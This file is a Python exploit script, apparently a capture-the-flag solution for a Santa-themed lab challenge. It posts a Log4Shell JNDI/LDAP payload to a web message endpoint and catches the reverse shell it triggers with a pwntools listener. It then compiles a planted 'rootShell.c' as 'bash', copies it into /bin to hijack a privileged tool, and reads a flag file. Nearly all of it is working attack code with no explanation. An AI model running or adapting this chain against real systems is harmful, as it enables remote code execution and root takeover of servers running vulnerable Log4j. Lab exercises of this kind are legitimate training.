import requests, os
from log4jshellpoc.poc import *
from threading import Thread
from pwn import *

PORT = 9001
URL = 'https://xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx.rdocker.vuln.land/'

ip = os.popen('ip a | grep tun0 | grep inet').read().split(' ')[5]

Thread(target=initPayload, args=[ip, 8000, PORT]).start()

while not READY.is_set():
    sleep(0.1)

sleep(2)

ldapPayload = genLDAPPayload(ip)
info('Sending Log4j payload...')
requests.post(URL+'up/sendmessage', json={"name":"","message":ldapPayload})

r = listen(PORT)

r.wait_for_connection()

with open('rootShell.c') as f:
    rootShellCode = f.read()

r.sendline(f'echo {repr(rootShellCode)} > rootShell.c; gcc -o bash rootShell.c; cp ./bash /bin/; /santas-workshop/tool'.encode())
sleep(1)
r.sendline(b's')
sleep(1)
r.sendline(b'cat /home/santa/flag.txt; exit')

r.interactive()